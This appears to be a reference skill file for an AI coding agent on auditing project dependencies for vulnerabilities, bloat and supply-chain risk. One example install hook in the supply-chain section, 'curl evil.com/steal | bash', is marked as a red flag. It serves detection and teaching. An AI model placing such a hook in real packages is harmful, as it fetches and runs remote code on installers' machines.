---
name: dependency-audit
description: Dependency security and hygiene audit. Auto-load when reviewing package.json, Gemfile, requirements.txt, or when asked about dependency vulnerabilities, outdated packages, or supply chain risk.
---

# Dependency Audit Reference

Audit dependencies for security vulnerabilities, unnecessary bloat, and supply chain risk.

## Why Dependencies Are Risky

Every dependency you add is code you didn't write but are responsible for. It:
- May contain vulnerabilities (CVEs)
- May be abandoned (unmaintained)
- May be malicious (supply chain attack)
- Adds to bundle size and attack surface
- Brings its own transitive dependencies

**Rule of thumb:** The best dependency is the one you don't need.

## Security Vulnerability Audit

```bash
# npm — built-in audit
npm audit
npm audit --audit-level=high   # fail only on high/critical
npm audit fix                   # auto-fix where possible
npm audit fix --force           # upgrade majors (breaking changes risk)

# yarn
yarn audit

# pnpm
pnpm audit

# Python
pip-audit                       # pip install pip-audit
safety check                    # pip install safety

# Ruby
bundle audit                    # gem install bundler-audit
bundle audit update             # update vulnerability database

# GitHub: enable Dependabot alerts in repo settings
# Snyk: snyk test (broader coverage, CI integration)
```

## What to Look For in Audit Output

```
# npm audit example output
found 3 vulnerabilities (1 moderate, 2 high)

# For each vulnerability check:
# 1. Package name — is it direct or transitive?
# 2. Severity — Critical/High = fix now, Moderate/Low = plan fix
# 3. Path — which of your deps pulled it in
# 4. Fix availability — can it be resolved with npm audit fix?
# 5. CVE ID — look it up to understand actual exploitability
```

**Not all vulnerabilities are equally dangerous:**
- A vulnerability in a build-time-only dev dependency has zero runtime risk
- A ReDoS vulnerability in a regex library matters only if attacker controls regex input
- Read the CVE, don't just upgrade blindly

## Outdated Package Review

```bash
# npm
npm outdated              # shows current, wanted, latest
npm update                # updates within semver range
npx npm-check-updates     # shows available upgrades beyond range
npx npm-check-updates -u  # updates package.json to latest

# Python
pip list --outdated

# Ruby
bundle outdated
```

### Upgrade Strategy

```
Major versions (1.x → 2.x): Read changelog, check breaking changes, test thoroughly
Minor versions (1.1 → 1.2): Usually safe, but verify
Patch versions (1.1.1 → 1.1.2): Apply promptly (often security fixes)
```

## Unused Dependency Detection

```bash
# npm — depcheck
npx depcheck

# Output shows:
# Unused dependencies: packages in package.json not imported anywhere
# Unused devDependencies: build tools no longer in use
# Missing dependencies: imported but not listed (transitive leak)
```

Remove unused dependencies immediately — they add attack surface with zero benefit.

## Dependency Count Assessment

Too many dependencies is a smell. For each dependency, ask:
1. **Can I replace it with native API?** (`lodash.get` → optional chaining `?.`)
2. **Is it tiny enough to inline?** (small utility functions)
3. **Is it actively maintained?** (last commit, open issues, npm downloads)
4. **Is it well-audited?** (popular ≠ safe, but obscure = higher risk)

```bash
# Check package info
npm info <package>            # version, last publish, maintainers
npx package-phobia <package>  # shows install size
```

## Supply Chain Red Flags

Be suspicious of packages that:
- Have typosquatting names (lodash vs l0dash, express vs expres)
- Were recently transferred to a new maintainer
- Have unusual install scripts in `package.json` (`preinstall`, `postinstall`)
- Have far more network/file system access than their purpose requires
- Have a single maintainer with no organizational backing

```json
// Check for suspicious install hooks:
{
  "scripts": {
    "preinstall": "curl evil.com/steal | bash",  // ← RED FLAG
    "postinstall": "./some-script.sh"              // ← Investigate this
  }
}
```

## Lock File Hygiene

```bash
# Always commit lock files
package-lock.json    # npm
yarn.lock            # yarn
pnpm-lock.yaml       # pnpm
Pipfile.lock         # Python/pipenv
Gemfile.lock         # Ruby

# Never commit node_modules/
# Lock files ensure reproducible installs — protect them

# Detect tampering: lock file changed without package.json changes
git diff HEAD~1 package-lock.json   # Review unexpected changes
```

## CI/CD Integration

```yaml
# GitHub Actions — run audit on every PR
- name: Security Audit
  run: npm audit --audit-level=high

# Block merges if audit fails
# Use Dependabot or Renovate for automated dependency PRs
```

## Audit Checklist

- [ ] `npm audit` (or equivalent) passes with no high/critical issues
- [ ] No packages with known CVEs in dependencies
- [ ] All packages have been updated within the last 12 months (major) / 6 months (patch)
- [ ] No unused dependencies (`depcheck` clean)
- [ ] Lock file committed and reviewed for unexpected changes
- [ ] No suspicious `preinstall`/`postinstall` scripts
- [ ] Dev dependencies are not in `dependencies` (should be `devDependencies`)
- [ ] Bundle size is justified (use `bundlephobia` or `size-limit`)
